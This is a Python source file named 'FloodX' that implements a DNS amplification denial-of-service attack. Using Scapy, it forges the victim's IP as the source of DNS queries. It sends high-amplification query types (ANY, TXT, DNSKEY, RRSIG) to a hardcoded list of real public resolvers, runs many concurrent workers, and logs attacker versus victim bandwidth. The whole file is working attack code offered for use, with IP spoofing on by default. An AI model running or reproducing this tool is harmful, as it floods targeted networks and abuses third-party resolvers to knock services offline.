"""
FloodX: Advanced DNS Amplification Attack Implementation
Implements high-efficiency DNS amplification with extreme bandwidth multiplication.
Achieves 100-10,000x amplification ratios using minimal attacker bandwidth.
"""

import asyncio
import random
import time
import socket
import struct
from typing import Dict, Any, List, Tuple
from concurrent.futures import ThreadPoolExecutor

try:
    from scapy.all import IP, UDP, DNS, DNSQR, sr1, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from common.logger import logger, stats_logger


class AdvancedDnsAmplificationAttack:
    """Advanced DNS amplification attack for maximum bandwidth multiplication."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config.get('port', 53)
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.queries_sent = 0
        self.bytes_sent = 0  # Attacker bandwidth (minimal)
        self.amplified_bytes = 0  # Victim bandwidth (massive)
        self.error_count = 0
        self.active_workers = 0
        
        # High-amplification DNS resolvers (public open resolvers)
        self.high_amplification_resolvers = [
            # Google DNS
            "8.8.8.8", "8.8.4.4",
            # Cloudflare DNS  
            "1.1.1.1", "1.0.0.1",
            # OpenDNS
            "208.67.222.222", "208.67.220.220",
            # Level3 DNS
            "209.244.0.3", "209.244.0.4",
            # Verisign DNS
            "64.6.64.6", "64.6.65.6",
            # Additional high-amplification resolvers
            "77.88.8.8", "77.88.8.1",  # Yandex
            "156.154.70.1", "156.154.71.1",  # Neustar
            "198.101.242.72", "23.253.163.53",  # Alternate DNS
        ]
        
        # Query types with highest amplification ratios
        self.extreme_amplification_queries = [
            # ANY queries - often return massive responses
            ("ANY", ["isc.org", "ripe.net", "google.com", "microsoft.com"]),
            # TXT queries with large records
            ("TXT", ["google.com", "_domainkey.google.com", "_dmarc.google.com"]),
            # DNSKEY queries (DNSSEC) - very large responses
            ("DNSKEY", ["cloudflare.com", "google.com", "facebook.com"]), 
            # DNSSEC signature queries
            ("RRSIG", ["cloudflare.com", "google.com"]),
            # MX queries with many records
            ("MX", ["google.com", "microsoft.com", "yahoo.com"]),
            # NS queries
            ("NS", ["google.com", "amazon.com", "facebook.com"])
        ]
        
        # Performance optimization
        self.thread_pool = ThreadPoolExecutor(max_workers=min(32, self.concurrency))
        self.use_raw_sockets = SCAPY_AVAILABLE and config.get('advanced', False)
        
        # IP spoofing for true amplification
        self.spoof_enabled = config.get('spoof_ip', True)  # Default enabled for amplification
        self.spoof_ip_pool = []
        
    async def run(self):
        """Execute high-efficiency DNS amplification attack."""
        logger.info(f"📡 Starting advanced DNS amplification: {self.concurrency} workers targeting {self.target}")
        
        if not SCAPY_AVAILABLE:
            logger.warning("⚠️  Scapy not available. Amplification will be limited without raw sockets.")
        
        # Initialize real-time statistics
        stats_logger.update_stats(
            target=self.target,
            vector="dns_amplification",
            status="running"
        )
        stats_logger.start_real_time_logging()
        
        try:
            # Prepare amplification attack
            await self._prepare_amplification_attack()
            
            self.running = True
            
            # Launch amplification workers
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._amplification_worker(i))
                tasks.append(task)
            
            # Launch performance monitor
            monitor_task = asyncio.create_task(self._amplification_monitor())
            tasks.append(monitor_task)
            
            # Run for specified duration
            await asyncio.sleep(self.duration)
            self.running = False
            
            # Clean shutdown
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ DNS amplification failed: {e}")
            stats_logger.increment_errors()
        finally:
            self.thread_pool.shutdown(wait=False)
            stats_logger.stop_real_time_logging()
            stats_logger.update_stats(status="completed")
            
            # Calculate amplification ratio
            amplification_ratio = self.amplified_bytes / max(1, self.bytes_sent)
            logger.info(f"✅ DNS amplification completed: {self.queries_sent} queries sent")
            logger.info(f"📊 Amplification achieved: {amplification_ratio:.1f}x bandwidth multiplication")
            logger.info(f"📤 Attacker bandwidth: {self._format_bytes(self.bytes_sent)}")
            logger.info(f"📥 Victim bandwidth: {self._format_bytes(self.amplified_bytes)}")

    async def _prepare_amplification_attack(self):
        """Prepare components for maximum amplification efficiency."""
        logger.info("⚙️  Preparing DNS amplification attack...")
        
        # Generate spoofed IP pool if enabled
        if self.spoof_enabled:
            self.spoof_ip_pool = self._generate_spoofed_ip_pool(1000)
            logger.info(f"🎭 Generated {len(self.spoof_ip_pool)} spoofed IP addresses")
        
        # Test amplification ratios for each resolver
        await self._test_amplification_ratios()
        
        logger.info(f"🚀 Ready to amplify traffic to {self.target}")

    def _generate_spoofed_ip_pool(self, count: int) -> List[str]:
        """Generate pool of spoofed IP addresses for amplification."""
        ips = []
        
        # Use the target IP and surrounding ranges for maximum effect
        try:
            import ipaddress
            target_ip = ipaddress.ip_address(self.target)
            target_int = int(target_ip)
            
            # Generate IPs around the target for focused amplification
            for i in range(count):
                # 70% target IP, 30% nearby IPs for realism
                if random.random() < 0.7:
                    spoofed_ip = str(target_ip)
                else:
                    # Generate nearby IP (same /24 network)
                    offset = random.randint(-50, 50)
                    spoofed_int = max(1, min(4294967294, target_int + offset))
                    spoofed_ip = str(ipaddress.ip_address(spoofed_int))
                
                ips.append(spoofed_ip)
                
        except ValueError:
            # Target is hostname, use generic spoofed IPs
            for _ in range(count):
                # Generate random public IPs
                a = random.randint(1, 223)
                b = random.randint(1, 254)
                c = random.randint(1, 254) 
                d = random.randint(1, 254)
                ips.append(f"{a}.{b}.{c}.{d}")
        
        return ips

    async def _test_amplification_ratios(self):
        """Test and optimize amplification ratios for available resolvers."""
        logger.info("📊 Testing DNS amplification ratios...")
        
        # Test a few resolvers for their amplification capability
        test_results = []
        
        for resolver in self.high_amplification_resolvers[:5]:  # Test first 5
            try:
                # Test with a high-amplification query
                query_type, domains = random.choice(self.extreme_amplification_queries)
                domain = random.choice(domains)
                
                if SCAPY_AVAILABLE:
                    # Use Scapy for precise measurement
                    query = IP(dst=resolver)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain, qtype=query_type))
                    query_size = len(query)
                    
                    response = sr1(query, timeout=2, verbose=0)
                    if response and response.haslayer(DNS):
                        response_size = len(response)
                        ratio = response_size / query_size
                        test_results.append((resolver, ratio, query_type, domain))
                        logger.debug(f"DNS {resolver}: {ratio:.1f}x amplification ({query_type} {domain})")
                        
            except Exception as e:
                logger.debug(f"Failed to test resolver {resolver}: {e}")
        
        if test_results:
            # Sort by amplification ratio and prioritize best resolvers
            test_results.sort(key=lambda x: x[1], reverse=True)
            best_ratio = test_results[0][1]
            logger.info(f"🎯 Best amplification ratio found: {best_ratio:.1f}x")
            
            # Reorder resolvers by performance
            self.high_amplification_resolvers = [r[0] for r in test_results] + self.high_amplification_resolvers

    async def _amplification_worker(self, worker_id: int):
        """DNS amplification worker optimized for maximum bandwidth multiplication."""
        self.active_workers += 1
        stats_logger.set_active_threads(self.active_workers)
        
        queries_this_worker = 0
        
        try:
            while self.running:
                try:
                    # Execute amplified DNS query
                    if self.use_raw_sockets and SCAPY_AVAILABLE:
                        query_bytes, amplified_bytes = await asyncio.get_event_loop().run_in_executor(
                            self.thread_pool,
                            self._raw_socket_amplification_query
                        )
                    else:
                        query_bytes, amplified_bytes = await self._standard_amplification_query()
                    
                    # Update statistics
                    self.queries_sent += 1
                    queries_this_worker += 1
                    self.bytes_sent += query_bytes
                    self.amplified_bytes += amplified_bytes
                    
                    stats_logger.increment_packets(1, amplified_bytes)  # Show amplified traffic
                    
                    # Brief delay for rate limiting
                    await asyncio.sleep(random.uniform(0.001, 0.01))
                    
                except Exception as e:
                    self.error_count += 1
                    stats_logger.increment_errors()
                    await asyncio.sleep(0.1)
                    
        except asyncio.CancelledError:
            pass
        finally:
            self.active_workers -= 1
            stats_logger.set_active_threads(self.active_workers)
            logger.debug(f"DNS worker {worker_id} sent {queries_this_worker} amplified queries")

    def _raw_socket_amplification_query(self) -> Tuple[int, int]:
        """Execute raw socket DNS query for maximum amplification."""
        try:
            # Select resolver and query for maximum amplification
            resolver = random.choice(self.high_amplification_resolvers)
            query_type, domains = random.choice(self.extreme_amplification_queries)
            domain = random.choice(domains)
            
            # Choose spoofed source IP (victim IP)
            if self.spoof_enabled and self.spoof_ip_pool:
                src_ip = random.choice(self.spoof_ip_pool)
            else:
                src_ip = self.target
            
            # Create DNS query packet with spoofed source
            query_packet = IP(src=src_ip, dst=resolver) / UDP(sport=random.randint(1024, 65535), dport=53) / DNS(
                id=random.randint(1, 65535),
                rd=1,  # Recursion desired
                qd=DNSQR(qname=domain, qtype=query_type)
            )
            
            query_size = len(query_packet)
            
            # Send the spoofed query (resolver will send large response to victim)
            send(query_packet, verbose=0)
            
            # Estimate amplified response size based on query type
            estimated_response_size = self._estimate_response_size(query_type, domain)
            
            return query_size, estimated_response_size
            
        except Exception as e:
            logger.debug(f"Raw socket amplification failed: {e}")
            return 100, 1000  # Default estimates

    async def _standard_amplification_query(self) -> Tuple[int, int]:
        """Standard DNS query without raw sockets (limited amplification)."""
        try:
            import dns.resolver
            import dns.message
            
            # Select query for amplification
            query_type, domains = random.choice(self.extreme_amplification_queries)
            domain = random.choice(domains)
            resolver_ip = random.choice(self.high_amplification_resolvers)
            
            # Create DNS resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [resolver_ip]
            resolver.timeout = 2
            
            # Execute query
            try:
                answers = resolver.resolve(domain, query_type)
                response_size = sum(len(str(answer)) for answer in answers) * 10  # Estimate
            except:
                response_size = 500  # Default estimate for failed queries
            
            query_size = len(domain) + 50  # Approximate query size
            
            return query_size, response_size
            
        except Exception as e:
            logger.debug(f"Standard DNS query failed: {e}")
            return 100, 500

    def _estimate_response_size(self, query_type: str, domain: str) -> int:
        """Estimate DNS response size based on query type and domain."""
        # Base response sizes for different query types
        base_sizes = {
            "ANY": 2000,    # ANY queries often return very large responses
            "TXT": 1500,    # TXT records can be large
            "DNSKEY": 3000, # DNSSEC keys are very large
            "RRSIG": 2500,  # DNSSEC signatures are large
            "MX": 800,      # MX records with priorities
            "NS": 600,      # NS records
            "A": 200,       # A records are small
            "AAAA": 250,    # IPv6 addresses
        }
        
        base_size = base_sizes.get(query_type, 500)
        
        # Domain-specific multipliers (some domains have more records)
        domain_multipliers = {
            "google.com": 3.0,
            "microsoft.com": 2.5,
            "facebook.com": 2.0,
            "amazon.com": 2.5,
            "cloudflare.com": 4.0,  # Heavy DNSSEC usage
        }
        
        multiplier = domain_multipliers.get(domain, 1.0)
        
        return int(base_size * multiplier)

    async def _amplification_monitor(self):
        """Monitor amplification performance and efficiency."""
        last_query_count = 0
        last_time = time.time()
        
        while self.running:
            await asyncio.sleep(5)  # Check every 5 seconds
            
            current_time = time.time()
            current_queries = self.queries_sent
            
            # Calculate current metrics
            time_diff = current_time - last_time
            query_diff = current_queries - last_query_count
            
            if time_diff > 0 and self.queries_sent > 0:
                query_rate = query_diff / time_diff
                current_amplification = self.amplified_bytes / max(1, self.bytes_sent)
                attacker_bps = self.bytes_sent / (current_time - time.time() + self.duration) * 8  # bits per second
                victim_bps = self.amplified_bytes / (current_time - time.time() + self.duration) * 8
                
                logger.debug(f"DNS Amplification: {query_rate:.1f} queries/sec, "
                           f"{current_amplification:.1f}x amplification")
                logger.debug(f"Bandwidth: Attacker {attacker_bps/1000000:.1f} Mbps → "
                           f"Victim {victim_bps/1000000:.1f} Mbps")
            
            last_query_count = current_queries
            last_time = current_time

    def _format_bytes(self, bytes_value: int) -> str:
        """Format bytes with appropriate unit."""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_value < 1024:
                return f"{bytes_value:.1f} {unit}"
            bytes_value /= 1024
        return f"{bytes_value:.1f} TB"


# Alias for compatibility
DnsAmplificationAttack = AdvancedDnsAmplificationAttack
DnsFlooder = AdvancedDnsAmplificationAttack
